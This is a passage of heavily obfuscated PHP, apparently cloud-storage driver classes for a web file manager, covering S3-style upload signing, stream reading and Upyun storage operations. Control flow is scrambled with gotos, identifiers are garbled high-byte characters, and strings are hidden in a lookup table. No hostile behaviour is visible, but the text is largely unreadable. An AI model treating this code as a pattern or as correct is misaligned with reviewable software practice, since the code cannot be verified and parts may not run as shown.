isset($b‘ü÷˜¡ßø[$a÷©ÓêÁ‚â[168]]) ? $b‘ü÷˜¡ßø[$a÷©ÓêÁ‚â[168]] : $a÷©ÓêÁ‚â[33]; $AóñÚÁÉßå = $b‘ü÷˜¡ßø[$a÷©ÓêÁ‚â[93]]; goto FÏ´ÈÁÉµ∫; cﬂ†≈›‘Øµ: if (isset($b‘ü÷˜¡ßø[$a÷©ÓêÁ‚â[1347]])) { $AÒƒ√∏ãêÙ[$a÷©ÓêÁ‚â[1348]] = $b‘ü÷˜¡ßø[$a÷©ÓêÁ‚â[1347]]; } $E∆ÕéÈòÔÇ = explode($a÷©ÓêÁ‚â[177], $this->getHost()); $E®ôÚêÊ≈Ï = array($a÷©ÓêÁ‚â[1349] => $E∆ÕéÈòÔÇ[1], $a÷©ÓêÁ‚â[1350] => $a÷©ÓêÁ‚â[33], $a÷©ÓêÁ‚â[211] => $a÷©ÓêÁ‚â[119], $a÷©ÓêÁ‚â[1264] => $b‘ü÷˜¡ßø[$a÷©ÓêÁ‚â[78]]); goto Bˆï±úØ±ã; Bˆï±úØ±ã: $f·ü≠ıèÑÛ = $a÷©ÓêÁ‚â[226]; $dõ‘¡ŒÖÖé = $a÷©ÓêÁ‚â[8] . $this->pathEncode($AóñÚÁÉßå) . $eú«‹€™¶Ÿ; $f≈≈ÉÀî©¶ = $this->client->__getSignatureV4($AÒƒ√∏ãêÙ, $E®ôÚêÊ≈Ï, $f·ü≠ıèÑÛ, $dõ‘¡ŒÖÖé); goto CõíÑôÕƒ„; FÏ´ÈÁÉµ∫: unset($b‘ü÷˜¡ßø[$a÷©ÓêÁ‚â[93]]); if (isset($b‘ü÷˜¡ßø[$a÷©ÓêÁ‚â[223]])) { return $this->listUploadParts($AóñÚÁÉßå, $b‘ü÷˜¡ßø); } $AÒƒ√∏ãêÙ = array(); goto cﬂ†≈›‘Øµ; CõíÑôÕƒ„: if (strpos($eú«‹€™¶Ÿ, $a÷©ÓêÁ‚â[225]) === 0) { if (isset($AÒƒ√∏ãêÙ[$a÷©ÓêÁ‚â[1348]])) { $Cá†ŒªëÈá = $AÒƒ√∏ãêÙ[$a÷©ÓêÁ‚â[1348]]; } else { if (isset($f≈≈ÉÀî©¶[$a÷©ÓêÁ‚â[1348]])) { $Cá†ŒªëÈá = $f≈≈ÉÀî©¶[$a÷©ÓêÁ‚â[1348]]; } else { $Cá†ŒªëÈá = hash($a÷©ÓêÁ‚â[1262], $a÷©ÓêÁ‚â[33]); } } return array($a÷©ÓêÁ‚â[232] => $f≈≈ÉÀî©¶[$a÷©ÓêÁ‚â[232]], $a÷©ÓêÁ‚â[1348] => $Cá†ŒªëÈá, $a÷©ÓêÁ‚â[222] => $f≈≈ÉÀî©¶[$a÷©ÓêÁ‚â[1351]]); } return $f≈≈ÉÀî©¶[$a÷©ÓêÁ‚â[232]]; goto Bıï«öî†ï; Bıï«öî†ï: } public function listUploadParts($b§„“¯‘êû, $bŒ∑Ó‡åè§ = array()) { goto C€≥Üê¥›ã; BÂµÃ†—∏â: $AƒÑ“›∆§¬ = $this->client->__getSignatureV4($Eñ¯èõ—Ê‚, $eµìç≤Æ§ò, $F»†∫±∆„ﬁ, $a‹π√«ÑªÉ, $cóˆºçÓ¬Õ); return array($fÕÇÛóÀ⁄Ï[232] => $AƒÑ“›∆§¬[$fÕÇÛóÀ⁄Ï[232]], $fÕÇÛóÀ⁄Ï[222] => $AƒÑ“›∆§¬[$fÕÇÛóÀ⁄Ï[1351]], $fÕÇÛóÀ⁄Ï[234] => $B†‚âì∏ØÙ, $fÕÇÛóÀ⁄Ï[1348] => $AƒÑ“›∆§¬[$fÕÇÛóÀ⁄Ï[1348]]); goto eÚ˜¨ºÊ; CÔÉƒ€Ñªﬂ: if (!$B†‚âì∏ØÙ) { return !1; } $cóˆºçÓ¬Õ = $fÕÇÛóÀ⁄Ï[1352]; foreach ($B†‚âì∏ØÙ as $f›‰˜ﬂ„õè) { $cóˆºçÓ¬Õ .= $fÕÇÛóÀ⁄Ï[1353] . "\74\x50\x61\162\164\x4e\x75\x6d\x62\x65\x72\76{$f›‰˜ﬂ„õè[$fÕÇÛóÀ⁄Ï[1309]]}\74\57\x50\x61\x72\164\116\x75\155\142\145\x72\x3e\xa" . "\x3c\x45\x54\141\147\76{$f›‰˜ﬂ„õè[$fÕÇÛóÀ⁄Ï[1310]]}\74\57\x45\x54\141\x67\76\xa" . $fÕÇÛóÀ⁄Ï[1354]; } goto AÒƒ’ﬂåÔé; aµ§∂„˜°—: $eµìç≤Æ§ò = array($fÕÇÛóÀ⁄Ï[1349] => $e’äÁπ’≈≥[1], $fÕÇÛóÀ⁄Ï[211] => $fÕÇÛóÀ⁄Ï[119], $fÕÇÛóÀ⁄Ï[1264] => strlen($cóˆºçÓ¬Õ)); $F»†∫±∆„ﬁ = $fÕÇÛóÀ⁄Ï[224]; $a‹π√«ÑªÉ = $fÕÇÛóÀ⁄Ï[8] . $this->pathEncode($b§„“¯‘êû) . $bŒ∑Ó‡åè§[$fÕÇÛóÀ⁄Ï[168]]; goto BÂµÃ†—∏â; C€≥Üê¥›ã: $fÕÇÛóÀ⁄Ï =& $_SERVER[’ÿƒ†ïò]; $E”—‰πº≈ñ = str_replace($fÕÇÛóÀ⁄Ï[233], $fÕÇÛóÀ⁄Ï[33], $bŒ∑Ó‡åè§[$fÕÇÛóÀ⁄Ï[168]]); $B†‚âì∏ØÙ = $this->client->listParts($this->bucket, $b§„“¯‘êû, $E”—‰πº≈ñ); goto CÔÉƒ€Ñªﬂ; AÒƒ’ﬂåÔé: $cóˆºçÓ¬Õ .= $fÕÇÛóÀ⁄Ï[1355]; $Eñ¯èõ—Ê‚ = array(); $e’äÁπ’≈≥ = explode($fÕÇÛóÀ⁄Ï[177], $this->getHost()); goto aµ§∂„˜°—; eÚ˜¨ºÊ: } public function link($e∏ı‚®ƒá, $E´ä‹è⁄Ù“ = array()) { return parent::link($e∏ı‚®ƒá, $E´ä‹è⁄Ù“); } public function fileOut($EÂò™´ó¿Ì, $Cöì˜Æµ˘§ = false, $bú≤ˆ√–‚Á = false, $BŸòúíıŸ® = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[’ÿƒ†ïò][1356])) { return parent::fileOutServer($EÂò™´ó¿Ì, $Cöì˜Æµ˘§, $bú≤ˆ√–‚Á, $BŸòúíıŸ®); } parent::fileOut($EÂò™´ó¿Ì, $Cöì˜Æµ˘§, $bú≤ˆ√–‚Á, $BŸòúíıŸ®); } public function fileOutImage($dº·Ö–§Ëë, $FÔ…éˆ¶Â• = 250) { if (strstr($this->endpoint, $_SERVER[’ÿƒ†ïò][1356])) { return parent::fileOutImageServer($dº·Ö–§Ëë, $FÔ…éˆ¶Â•); } parent::fileOutImage($dº·Ö–§Ëë, $FÔ…éˆ¶Â•); } public function fileOutLink($d¯€éÑÁ…) { $a´Ú›á⁄ó =& $_SERVER[’ÿƒ†ïò]; if (substr($d¯€éÑÁ…, 0, 7) == $a´Ú›á⁄ó[1232]) { $d¯€éÑÁ… = $a´Ú›á⁄ó[1233] . substr($d¯€éÑÁ…, 7); } header($a´Ú›á⁄ó[159] . $d¯€éÑÁ…); die; } public function getHost() { $FÿÛÏı∏È∂ =& $_SERVER[’ÿƒ†ïò]; $fÿ–µ˜î√ﬁ = str_rtrim(parent::getHost(), $FÿÛÏı∏È∂[8] . $this->bucket); $fÿ–µ˜î√ﬁ = explode($FÿÛÏı∏È∂[177], $fÿ–µ˜î√ﬁ); return $fÿ–µ˜î√ﬁ[0] . $FÿÛÏı∏È∂[177] . $this->bucket . $FÿÛÏı∏È∂[95] . $fÿ–µ˜î√ﬁ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($b†îã®ﬂ›å, $e°æﬂá≤á∂ = 0) { parent::__construct(); $this->source = $b†îã®ﬂ›å; $this->sourceSize = $e°æﬂá≤á∂; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($eÙÚ¡£öôë = false) { return $this->sourceSize; } public function getContent($Aâ´…à…‡— = false) { return $this->fileSubstr($Aâ´…à…‡—, 0, $this->sourceSize); } public function fileSubstr($a’êîªòò≈ = false, $a∞·¡ÉõÑ‹ = 0, $eáäΩöË‚≥ = 0) { if (!$eáäΩöË‚≥) { $eáäΩöË‚≥ = $this->sourceSize; } $bººÆΩÃ©Õ = $this->sourceSize - $a∞·¡ÉõÑ‹; if ($eáäΩöË‚≥ >= $bººÆΩÃ©Õ) { $eáäΩöË‚≥ = $bººÆΩÃ©Õ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $a∞·¡ÉõÑ‹, $eáäΩöË‚≥); } if ($this->sourceType == self::TYPE_FILE) { if ($eáäΩöË‚≥ <= 0) { return $_SERVER[’ÿƒ†ïò][33]; } $d¶¥Èà˘ˆ = ftell($this->source); fseek_64($this->source, $d¶¥Èà˘ˆ + $a∞·¡ÉõÑ‹); $eÑÏÔ¶√¢… = @fread($this->source, $eáäΩöË‚≥); fseek_64($this->source, $d¶¥Èà˘ˆ); return $eÑÏÔ¶√¢…; } } public function hashMd5($a“á∑Û∂àº = false) { return md5($this->getContent()); } public static function hash($F‰”‹˜–€ı, $Fü¯ìí‹Ôî = 0) { $B›ÿ€ËÈÛŸ = new PathDriverStream($F‰”‹˜–€ı, $Fü¯ìí‹Ôî); return $B›ÿ€ËÈÛŸ->hashSimple($F‰”‹˜–€ı); } public static function md5($eµèÜ»¬˘’, $DŸ«≠Ùå“√ = 0) { $Fª˜÷∏Ë„∫ = new PathDriverStream($eµèÜ»¬˘’, $DŸ«≠Ùå“√); return $Fª˜÷∏Ë„∫->hashMd5($eµèÜ»¬˘’); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\160\72\x2f\x2f\166\x30\56\x61\160\x69\56\165\160\171\x75\x6e\56\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($fã„≠ÑÛüà) { parent::__construct(); $this->_init($fã„≠ÑÛüà); } public function _init($C™Öê¿ëÒ¶) { $FáÍú‚ﬂ…¿ =& $_SERVER[’ÿƒ†ïò]; foreach ($C™Öê¿ëÒ¶ as $Aé¥óÀÕÉî => $BÊ≠†⁄ÿ∑Í) { if (isset($this->{$Aé¥óÀÕÉî})) { $this->{$Aé¥óÀÕÉî} = $BÊ≠†⁄ÿ∑Í; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($FáÍú‚ﬂ…¿[1357] . LNG($FáÍú‚ﬂ…¿[1290])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($b≥í˘≥—éÈ, $c„ÿ®ËÓÖÉ = "\x47\x45\x54") { $b≤èÔªôù¯ =& $_SERVER[’ÿƒ†ïò]; $eÊÀÿ„¢å≈ = gmdate($b≤èÔªôù¯[1323]); $aáûù§–ª™ = base64_encode(hash_hmac($b≤èÔªôù¯[1358], "{$c„ÿ®ËÓÖÉ}\46{$b≥í˘≥—éÈ}\x26{$eÊÀÿ„¢å≈}", md5("{$this->userpass}"), !0)); $A†ü‘‡ã∆È = array("\x41\x75\164\150\x6f\x72\151\172\141\x74\x69\x6f\156\72\125\x50\131\x55\x4e\x20{$this->username}\72{$aáûù§–ª™}", "\104\141\x74\145\72{$eÊÀÿ„¢å≈}"); return $A†ü‘‡ã∆È; } public function ussRequest($fÓÔ◊®ø””, $e˘∞ˆ®æÉé = "\x47\x45\124", $d‹üï€ ß† = false, $CôØ≠Ê¢˜• = false, $dß‰‰≈ÁÈª = false) { goto BºŸúÎ¶„Ö; B≠ò√ΩÀ¡Ü: $a·Èãå¨Âò = $this->ussHeaders($FÉÔ∏ §åü, $e˘∞ˆ®æÉé); if ($CôØ≠Ê¢˜•) { $a·Èãå¨Âò = array_merge($a·Èãå¨Âò, $CôØ≠Ê¢˜•); } $D‰∫π¥åÚö = url_request($this->endpoint . $FÉÔ∏ §åü, $e˘∞ˆ®æÉé, $d‹üï€ ß†, $a·Èãå¨Âò, $dß‰‰≈ÁÈª); goto a¨Ç∏àÔƒÕ; BºŸúÎ¶„Ö: $A◊££î°¥û =& $_SERVER[’ÿƒ†ïò]; $fÓÔ◊®ø”” = trim($fÓÔ◊®ø””, $A◊££î°¥û[8]); $FÉÔ∏ §åü = "\57{$this->bucket}\57{$fÓÔ◊®ø””}"; goto B≠ò√ΩÀ¡Ü; a¨Ç∏àÔƒÕ: if (!$D‰∫π¥åÚö) { return array($A◊££î°¥û[1114] => !1, $A◊££î°¥û[1116] => $A◊££î°¥û[1359]); } if (strtolower($e˘∞ˆ®æÉé) == $A◊££î°¥û[190] || in_array($D‰∫π¥åÚö[$A◊££î°¥û[1114]], array($A◊££î°¥û[1217], $A◊££î°¥û[1360]))) { $d‹üï€ ß† = $D‰∫π¥åÚö[$A◊££î°¥û[1361]]; } else { $d‹üï€ ß† = json_decode($D‰∫π¥åÚö[$A◊££î°¥û[1116]], !0); if (!$d‹üï€ ß†) { $d‹üï€ ß† = $D‰∫π¥åÚö[$A◊££î°¥û[1116]]; } else { if (!$D‰∫π¥åÚö[$A◊££î°¥û[738]] && isset($d‹üï€ ß†[$A◊££î°¥û[1362]])) { $d‹üï€ ß† = $d‹üï€ ß†[$A◊££î°¥û[1362]]; } } } return array($A◊££î°¥û[1114] => $D‰∫π¥åÚö[$A◊££î°¥û[738]], $A◊££î°¥û[1116] => $d‹üï€ ß†); goto dä„≈µô º; dä„≈µô º: } public function mkfile($eÓ’ﬁµäÍí, $D¢Úôó‚ˆï = '', $bô∆Œ√é∂¶ = REPEAT_RENAME) { if ($this->setContent($eÓ’ﬁµäÍí, $D¢Úôó‚ˆï)) { return $this->getPathOuter($eÓ’ﬁµäÍí); } return !1; } public function mkdir($bö£“∫≤ÖÓ, $c”¿‰·â§≤ = REPEAT_SKIP) { $A®èàÜöé⁄ =& $_SERVER[’ÿƒ†ïò]; $BÑä§Ω≠Àú = trim($bö£“∫≤ÖÓ, $A®èàÜöé⁄[8]); if ($this->_isFolder($BÑä§Ω≠Àú)) { return $this->getPathOuter($BÑä§Ω≠Àú); } $aΩÉÀÈΩºü = array($A®èàÜöé⁄[1363]); $FÀÍÌ≤•´ú = $this->ussRequest($BÑä§Ω≠Àú, $A®èàÜöé⁄[224], !1, $aΩÉÀÈΩºü); return $FÀÍÌ≤•´ú[$A®èàÜöé⁄[1114]] ? $this->getPathOuter($BÑä§Ω≠Àú) : !1; } public function copyFile($BÓï∂‰∞é‚, $f∞üæÑå¡´) { $E ÖëÕ†“ =& $_SERVER[’ÿƒ†ïò]; $Cíƒƒ≥’∂Ü = array($E ÖëÕ†“[1364] . "\x2f{$this->bucket}\x2f{$BÓï∂‰∞é‚}", $E ÖëÕ†“[1365]); $e†µÚâÏ∏ﬁ = $this->ussRequest($f∞üæÑå¡´, $E ÖëÕ†“[226], !1, $Cíƒƒ≥’∂Ü); return $e†µÚâÏ∏ﬁ[$E ÖëÕ†“[1114]] ? !0 : $this->getPathOuter($f∞üæÑå¡´); } public function moveFile($aç◊øçÇÑ◊, $bòÂœ¯¡®‚) { $cöïÀ¥≥±ﬂ =& $_SERVER[’ÿƒ†ïò]; $A≤ÍüÆùâ… = array($cöïÀ¥≥±ﬂ[1366] . "\x2f{$this->bucket}\x2f{$aç◊øçÇÑ◊}", $cöïÀ¥≥±ﬂ[1365]); $C„¡•Ö†§• = $this->ussRequest($bòÂœ¯¡®‚, $cöïÀ¥≥±ﬂ[226], !1, $A≤ÍüÆùâ…); return $C„¡•Ö†§•[$cöïÀ¥≥±ﬂ[1114]] ? !0 : $this->getPathOuter($bòÂœ¯¡®‚); } public function delFile($A•ÀÀº†ºı) { $e÷üê‚»ôÊ =& $_SERVER[’ÿƒ†ïò]; $aô…ÖÙùØŒ = $this->ussRequest($A•ÀÀº†ºı, $e÷üê‚»ôÊ[1367]); return $aô…ÖÙùØŒ[$e÷üê‚»ôÊ[1114]] ? !0 : !1; } public function delFolder($F÷¯îÉÒ†») { goto b‘˘ÑÉìÉÆ; fî˜äë¿Îß: foreach ($D◊«”µ–ÿÊ as $f∂åî∂»Ù∞) { $EçÔ†òìŒÇ = $this->ussRequest($f∂åî∂»Ù∞[$Eãﬂìªƒ´“[28]], $Eãﬂìªƒ´“[1367]); if (!$EçÔ†òìŒÇ[$Eãﬂìªƒ´“[1114]]) { return !1; } } foreach ($aÂ†ºõÑò´ as $Aœ¥ΩñÍª®) { $EçÔ†òìŒÇ = $this->ussRequest($Aœ¥ΩñÍª®, $Eãﬂìªƒ´“[1367]); if (!$EçÔ†òìŒÇ[$Eãﬂìªƒ´“[1114]]) { return !1; } } $EçÔ†òìŒÇ = $this->ussRequest($F÷¯îÉÒ†», $Eãﬂìªƒ´“[1367]); goto AòÛ…ÖÂô∆; b‘˘ÑÉìÉÆ: $Eãﬂìªƒ´“ =& $_SERVER[’ÿƒ†ïò]; if (!$this->exist($F÷¯îÉÒ†»)) { return !0; } $this->listItemCache = !1; goto F·çñå†—ô; AòÛ…ÖÂô∆: return $EçÔ†òìŒÇ[$Eãﬂìªƒ´“[1114]]; goto AÖÑ§ÚÑÒœ; F·çñå†—ô: $aÂ†ºõÑò´ = $D◊«”µ–ÿÊ = array(); $this->fileList($F÷¯îÉÒ†», $aÂ†ºõÑò´, $D◊«”µ–ÿÊ, !0); $this->listItemCache = !0; goto fî˜äë¿Îß; AÖÑ§ÚÑÒœ: } public function rename($f‡âÒÜô÷„, $aıÜ∫ÌÖì˘) { if ($this->isFile($f‡âÒÜô÷„)) { $aıÜ∫ÌÖì˘ = get_path_father($f‡âÒÜô÷„) . $aıÜ∫ÌÖì˘; return $this->moveFile($f‡âÒÜô÷„, $aıÜ∫ÌÖì˘); } return $this->renameObject($f‡âÒÜô÷„, $aıÜ∫ÌÖì˘); } public function fileInfo($bùöö˜Ü“, $BÁŸïÖäËÂ = false, $f‹«æÜù∂À = array()) { goto aªÊú∫Üè≠; bıÎ¡Æ∂◊Á: return $c§éÀÉâß‡; goto EíÀé®îÑÈ; aªÊú∫Üè≠: $A∂êÑÈÿñÇ =& $_SERVER[’ÿƒ†ïò]; $c§éÀÉâß‡ = array($A∂êÑÈÿñÇ[28] => $this->pathThis($bùöö˜Ü“), $A∂êÑÈÿñÇ[76] => $this->getPathOuter($A∂êÑÈÿñÇ[8] . $bùöö˜Ü“), $A∂êÑÈÿñÇ[29] => $A∂êÑÈÿñÇ[193], $A∂êÑÈÿñÇ[78] => isset($f‹«æÜù∂À[$A∂êÑÈÿñÇ[78]]) ? $f‹«æÜù∂À[$A∂êÑÈÿñÇ[78]] : 0, $A∂êÑÈÿñÇ[168] => $this->ext($bùöö˜Ü“)); if ($BÁŸïÖäËÂ) { return $c§éÀÉâß‡; } goto cÀ∏‹ª∂ÑÚ; d†ÁÑÇÍÃ˜: $c§éÀÉâß‡[$A∂êÑÈÿñÇ[194]] = intval($f‹«æÜù∂À[$A∂êÑÈÿñÇ[1368]]); $c§éÀÉâß‡[$A∂êÑÈÿñÇ[84]] = intval($f‹«æÜù∂À[$A∂êÑÈÿñÇ[1369]]); $c§éÀÉâß‡[$A∂êÑÈÿñÇ[78]] = $f‹«æÜù∂À[$A∂êÑÈÿñÇ[78]]; goto bıÎ¡Æ∂◊Á; cÀ∏‹ª∂ÑÚ: $c§éÀÉâß‡[$A∂êÑÈÿñÇ[194]] = $c§éÀÉâß‡[$A∂êÑÈÿñÇ[84]] = 0; $c§éÀÉâß‡[$A∂êÑÈÿñÇ[195]] = $c§éÀÉâß‡[$A∂êÑÈÿñÇ[196]] = !0; if (empty($f‹«æÜù∂À)) { $f‹«æÜù∂À = $this->objectMeta($bùöö˜Ü“); if (!$f‹«æÜù∂À) { return $c§éÀÉâß‡; } } goto d†ÁÑÇÍÃ˜; EíÀé®îÑÈ: } public function folderInfo($aÈ¥∂°ãÉ§, $bÍÀ∆Ê◊ÊÎ = false) { goto AﬁÈÂƒ∑ﬁú; D¢ØòπÛ÷÷: $e…≈áÙÇàë[$CãÁﬁÎúÒÊ[194]] = $e…≈áÙÇàë[$CãÁﬁÎúÒÊ[84]] = 0; $e…≈áÙÇàë[$CãÁﬁÎúÒÊ[195]] = $e…≈áÙÇàë[$CãÁﬁÎúÒÊ[196]] = !0; if (empty($CáŸ≈ÀÖ‡ï)) { $CáŸ≈ÀÖ‡ï = $this->objectMeta($aÈ¥∂°ãÉ§); if (!$CáŸ≈ÀÖ‡ï) { return $e…≈áÙÇàë; } } goto F°¥«˜Ã”Ñ; AﬁÈÂƒ∑ﬁú: $CãÁﬁÎúÒÊ =& $_SERVER[’ÿƒ†ïò]; $e…≈áÙÇàë = array($CãÁﬁÎúÒÊ[28] => $this->pathThis($aÈ¥∂°ãÉ§), $CãÁﬁÎúÒÊ[76] => $this->getPathOuter($CãÁﬁÎúÒÊ[8] . $aÈ¥∂°ãÉ§), $CãÁﬁÎúÒÊ[29] => $CãÁﬁÎúÒÊ[77]); if ($bÍÀ∆Ê◊ÊÎ) { return $e…≈áÙÇàë; } goto D¢ØòπÛ÷÷; F°¥«˜Ã”Ñ: $e…≈áÙÇàë[$CãÁﬁÎúÒÊ[194]] = intval($CáŸ≈ÀÖ‡ï[$CãÁﬁÎúÒÊ[1368]]); $e…≈áÙÇàë[$CãÁﬁÎúÒÊ[84]] = intval($CáŸ≈ÀÖ‡ï[$CãÁﬁÎúÒÊ[1369]]); return $e…≈áÙÇàë; goto DÑ¢ı∫«ı¡; DÑ¢ı∫«ı¡: } private function listObjs($E“ı’»•ˆÀ, $f≤èëÉèÛ± = 0, $c⁄‚≈¢•ûû = 1000) { $Eß∞ò•åãö =& $_SERVER[’ÿƒ†ïò]; $E∏ÿŒß¥«¶ = array($Eß∞ò•åãö[1370], $Eß∞ò•åãö[1371] . $c⁄‚≈¢•ûû); if ($f≤èëÉèÛ±) { $E∏ÿŒß¥«¶[] = $Eß∞ò•åãö[1372] . $f≤èëÉèÛ±; } $Bï»∫ƒÔÁë = $this->ussRequest($E“ı’»•ˆÀ, $Eß∞ò•åãö[228], !1, $E∏ÿŒß¥«¶); return !$Bï»∫ƒÔÁë[$Eß∞ò•åãö[1114]] ? !1 : $Bï»∫ƒÔÁë[$Eß∞ò•åãö[1116]]; } private function fileList($D©≥‘Îé«Ω, &$DÆ—Â’••Ò, &$B±â∞ØÑâ, $A—åÕµ•è◊ = false) { goto Fà›ÂÓ∞∑ú; a¥éÏÜ°Ñ£: if ($BïŸ”ÂçÓã) { $this->cacheMethod($F®ó≥–Îﬂô[199], $D©≥‘Îé«Ω, !0); } goto BªáÊ≠ÛÑì; Fà›ÂÓ∞∑ú: $F®ó≥–Îﬂô =& $_SERVER[’ÿƒ†ïò]; $Fˆ¡ãµí¬˜ = $F®ó≥–Îﬂô[33]; $f¯±‚ÀÈüä = 1000; goto e»„´ª∑ç¬; e»„´ª∑ç¬: $E√Û“ëﬂíÜ = rtrim($D©≥‘Îé«Ω, $F®ó≥–Îﬂô[8]) . $F®ó≥–Îﬂô[8]; $BïŸ”ÂçÓã = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $d¬·†Ãè»ƒ = $this->listObjs($D©≥‘Îé«Ω, $Fˆ¡ãµí¬˜, $f¯±‚ÀÈüä); if (!$d¬·†Ãè»ƒ) { return !1; } $Fˆ¡ãµí¬˜ = isset($d¬·†Ãè»ƒ[$F®ó≥–Îﬂô[1373]]) ? $d¬·†Ãè»ƒ[$F®ó≥–Îﬂô[1373]] : $F®ó≥–Îﬂô[33]; $DåÂØ—…˘Ñ = isset($d¬·†Ãè»ƒ[$F®ó≥–Îﬂô[1374]]) ? $d¬·†Ãè»ƒ[$F®ó≥–Îﬂô[1374]] : array(); foreach ($DåÂØ—…˘Ñ as $cÇñÂÑπµ) { $cÊ°´÷‹¨ö = $cÇñÂÑπµ[$F®ó≥–Îﬂô[29]] == $F®ó≥–Îﬂô[77] ? !0 : !1; $A≥Ûí⁄ÎØπ = ltrim($E√Û“ëﬂíÜ . $cÇñÂÑπµ[$F®ó≥–Îﬂô[28]], $F®ó≥–Îﬂô[8]) . ($cÊ°´÷‹¨ö ? $F®ó≥–Îﬂô[8] : $F®ó≥–Îﬂô[33]); $Aèò¿¥Ô±¨ = array($F®ó≥–Îﬂô[28] => $A≥Ûí⁄ÎØπ, $F®ó≥–Îﬂô[29] => $cÊ°´÷‹¨ö ? $F®ó≥–Îﬂô[77] : $F®ó≥–Îﬂô[193], $F®ó≥–Îﬂô[78] => $cÇñÂÑπµ[$F®ó≥–Îﬂô[335]], $F®ó≥–Îﬂô[1369] => $cÇñÂÑπµ[$F®ó≥–Îﬂô[1375]]); if ($BïŸ”ÂçÓã) { $this->cacheMethod($F®ó≥–Îﬂô[199], $A≥Ûí⁄ÎØπ, $cÊ°´÷‹¨ö); $this->cacheMethod($F®ó≥–Îﬂô[200], $A≥Ûí⁄ÎØπ, $Aèò¿¥Ô±¨); } if ($cÊ°´÷‹¨ö) { $DÆ—Â’••Ò[] = $A≥Ûí⁄ÎØπ; if ($A—åÕµ•è◊) { $this->fileList($A≥Ûí⁄ÎØπ, $DÆ—Â’••Ò, $B±â∞ØÑâ, $A—åÕµ•è◊); } continue; } $B±â∞ØÑâ[] = $Aèò¿¥Ô±¨; } if (count($DåÂØ—…˘Ñ) < $f¯±‚ÀÈüä) { break; } } goto a¥éÏÜ°Ñ£; BªáÊ≠ÛÑì: } public function listPath($béÊ–ìç«∞, $Cáé¨àéè£ = false) { $Cã“Ù›ûí– =& $_SERVER[’ÿƒ†ïò]; $Aﬂùﬂè„áï = $bó‰å±øâÕ = array(); $this->fileList($béÊ–ìç«∞, $Aﬂùﬂè„áï, $bó‰å±øâÕ); foreach ($Aﬂùﬂè„áï as $e≥®ô‹ƒ˜… => $Dõ¡ÒÆÆƒ∑) { $Aﬂùﬂè„áï[$e≥®ô‹ƒ˜…] = $this->folderInfo($Dõ¡ÒÆÆƒ∑, $Cáé¨àéè£); } foreach ($bó‰å±øâÕ as $e≥®ô‹ƒ˜… => $Dõ¡ÒÆÆƒ∑) { $bó‰å±øâÕ[$e≥®ô‹ƒ˜…] = $this->fileInfo($Dõ¡ÒÆÆƒ∑[$Cã“Ù›ûí–[28]], $Cáé¨àéè£, $Dõ¡ÒÆÆƒ∑); } return array($Cã“Ù›ûí–[75] => $Aﬂùﬂè„áï, $Cã“Ù›ûí–[74] => $bó‰å±øâÕ); } public function has($Fı≠´¨ΩŒã, $b‡âˆ¬àøØ = false, $f⁄èÓ¢‘Ù¥ = true) { goto C”–Ô««‹¯; e•ÜçÑê˘∞: while (!0) { check_abort(); $aÁæ°ãëõ÷ = $this->listObjs($Fı≠´¨ΩŒã, $CïêÍûÚ¡à, $DØªıëéÙË); if (!$aÁæ°ãëõ÷) { return !1; } $CïêÍûÚ¡à = isset($aÁæ°ãëõ÷[$eéˆö¥õ¢ö[1373]]) ? $aÁæ°ãëõ÷[$eéˆö¥õ¢ö[1373]] : $eéˆö¥õ¢ö[33]; $Böî„Ÿ¢™Ô = isset($aÁæ°ãëõ÷[$eéˆö¥õ¢ö[1374]]) ? $aÁæ°ãëõ÷[$eéˆö¥õ¢ö[1374]] : array(); if (empty($Böî„Ÿ¢™Ô)) { break; } $a¡áëñ‹˜ä = array_filter($Böî„Ÿ¢™Ô, function ($aîı©Ê¡—ÿ) { $FƒÀ∆ä∆„ê =& $_SERVER[’ÿƒ†ïò]; return $aîı©Ê¡—ÿ[$FƒÀ∆ä∆„ê[29]] == $FƒÀ∆ä∆„ê[77]; }); $DªË’ÏŸÛœ = count($Böî„Ÿ¢™Ô); $a¡áëñ‹˜ä = count($a¡áëñ‹˜ä); $fÇÛ¶ûñﬂì = $DªË’ÏŸÛœ - $a¡áëñ‹˜ä; if ($b‡âˆ¬àøØ) { $CåÃ‹ı¿ÿç += $a¡áëñ‹˜ä; $fµ¯óòº◊â += $fÇÛ¶ûñﬂì; if ($DªË’ÏŸÛœ < $DØªıëéÙË) { break; } continue; } if ($f⁄èÓ¢‘Ù¥) { if ($fÇÛ¶ûñﬂì) { return !0; } } else { if ($a¡áëñ‹˜ä) { return !0; } } if ($DªË’ÏŸÛœ < $DØªıëéÙË) { break; } } if ($b‡âˆ¬àøØ) { return array($eéˆö¥õ¢ö[203] => $fµ¯óòº◊â, $eéˆö¥õ¢ö[204] => $CåÃ‹ı¿ÿç); } return !1; goto F∫˜∆¿±–¶; Bç ÜÈ¥ÛŸ: $fµ¯óòº◊â = 0; $CåÃ‹ı¿ÿç = 0; $DÓ∏á†òúò = rtrim($Fı≠´¨ΩŒã, $eéˆö¥õ¢ö[8]) . $eéˆö¥õ¢ö[8]; goto e•ÜçÑê˘∞; C”–Ô««‹¯: $eéˆö¥õ¢ö =& $_SERVER[’ÿƒ†ïò]; $CïêÍûÚ¡à = $eéˆö¥õ¢ö[33]; $DØªıëéÙË = 500; goto Bç ÜÈ¥ÛŸ; F∫˜∆¿±–¶: } public function listAll($F≤ÑóñâƒÓ) { goto cåÌŒÒ˘ÿ⁄; a⁄ÁÙåâÖº: return $this->listAllFiles($F≤ÑóñâƒÓ, array_keys($Câõ¨ïú¨›), $Câõ¨ïú¨›); goto bû„”ñ¯Íñ; D¨æò¢Øœá: $Câõ¨ïú¨› = array(); foreach ($CÊéöÁ™äÑ as $büÂÜé’†∫) { $Câõ¨ïú¨›[$büÂÜé’†∫[$EÍ˜âå¥úí[28]]] = $büÂÜé’†∫[$EÍ˜âå¥úí[78]]; 